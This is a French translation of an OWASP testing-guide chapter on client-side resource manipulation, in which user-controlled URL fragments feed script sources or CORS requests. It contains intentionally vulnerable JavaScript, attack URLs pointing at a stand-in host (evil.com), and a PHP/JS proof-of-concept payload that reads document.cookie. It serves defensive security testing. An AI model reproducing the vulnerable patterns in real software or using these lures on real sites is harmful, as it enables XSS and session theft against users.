# Test de la manipulation des ressources côté client

|ID          |
|------------|
|WSTG-CLNT-06|

## Sommaire

Une vulnérabilité de manipulation de ressources côté client est une faille de validation d'entrée. Cela se produit lorsqu'une application accepte une entrée contrôlée par l'utilisateur qui spécifie le chemin d'une ressource telle que la source d'un iframe, JavaScript, applet ou le gestionnaire d'un XMLHttpRequest. Cette vulnérabilité consiste en la capacité de contrôler les URL qui pointent vers certaines ressources présentes dans une page Web. L'impact de cette vulnérabilité varie et elle est généralement adoptée pour mener des attaques XSS. Cette vulnérabilité permet d'interférer avec le comportement attendu de l'application en lui faisant charger et restituer des objets malveillants.

Le code JavaScript suivant montre un éventuel script vulnérable dans lequel un attaquant est capable de contrôler le `location.hash` (source) qui atteint l'attribut `src` d'un élément de script. Ce cas particulier conduit à une attaque XSS car du JavaScript externe pourrait être injecté.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Un attaquant pourrait cibler une victime en lui faisant visiter cette URL :

`www.victim.com/#http://evil.com/js.js`

Où `js.js` contient :

```js
alert(document.cookie)
```

Cela entraînerait l'apparition de l'alerte sur le navigateur de la victime.

Un scénario plus préjudiciable implique la possibilité de contrôler l'URL appelée dans une requête CORS. Étant donné que CORS permet à la ressource cible d'être accessible par le domaine demandeur via une approche basée sur l'en-tête, l'attaquant peut demander à la page cible de charger du contenu malveillant à partir de son propre site Web.

Voici un exemple de page vulnérable :

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

Le `location.hash` est contrôlé par l'entrée de l'utilisateur et est utilisé pour demander une ressource externe, qui sera ensuite reflétée via la construction `innerHTML`. Un attaquant pourrait demander à une victime de visiter l'URL suivante :

`www.victim.com/#http://evil.com/html.html`

Avec le gestionnaire de charge utile pour `html.html` :

```html
<?php
header('Access-Control-Allow-Origin: http://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Objectifs des tests

- Identifiez les puits avec une validation d'entrée faible.
- Évaluer l'impact de la manipulation des ressources.

## Comment tester

Pour vérifier manuellement ce type de vulnérabilité, nous devons identifier si l'application utilise des entrées sans les valider correctement. Si c'est le cas, ces entrées sont sous le contrôle de l'utilisateur et pourraient être utilisées pour spécifier des ressources externes. Étant donné qu'il existe de nombreuses ressources pouvant être incluses dans l'application (telles que des images, des vidéos, des objets, des CSS et des iframes), les scripts côté client qui gèrent les URL associées doivent être examinés pour les problèmes potentiels.

Le tableau suivant montre les points d'injection possibles (puits) qui doivent être vérifiés :

| Type de ressource | Tag/Méthode                             | Sink   |
| ----------------- | --------------------------------------- | ------ |
| Frame             | iframe                                  | src    |
| Link              | a                                       | href   |
| AJAX Request      | `xhr.open(method, [url], true);`        | URL    |
| CSS               | link                                    | href   |
| Image             | img                                     | src    |
| Object            | object                                  | data   |
| Script            | script                                  | src    |

Les plus intéressantes sont celles qui permettent à un attaquant d'inclure du code côté client (par exemple JavaScript) pouvant conduire à des vulnérabilités XSS.
